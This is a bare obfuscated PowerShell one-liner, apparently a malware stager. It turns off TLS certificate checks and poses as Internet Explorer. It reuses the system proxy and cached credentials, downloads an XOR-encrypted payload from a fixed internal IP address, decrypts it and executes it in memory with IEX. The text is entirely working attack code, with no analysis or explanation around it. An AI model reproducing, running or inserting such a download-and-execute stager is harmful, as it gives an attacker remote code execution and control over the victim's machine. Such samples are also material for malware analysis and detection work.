
[SYsTem.NeT.ServIcePOInTMAnager]::EXPecT100ConTinUE = 0;$Wc=NeW-OBJeCt SYstEM.NET.WebClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEADErs.Add('User-Agent',$u);$Wc.PRoXy = [SYsTem.NET.WEBReqUeST]::DEFaULtWEBProxY;$wc.PrOXy.CrEDEnTIAlS = [SYSteM.Net.CreDEntIaLCacHE]::DefaULtNETWoRKCRedEntiAls;$K='PdFfwG9`M,Kiy\Ibm1o2?^ElJh*NTt]&';$i=0;[CHAr[]]$b=([chaR[]]($Wc.DoWnloADSTriNG("https://172.30.18.11:443/index.asp")))|%{$_-bXOR$k[$i++%$k.LEnGTH]};IEX ($b-joIN'')

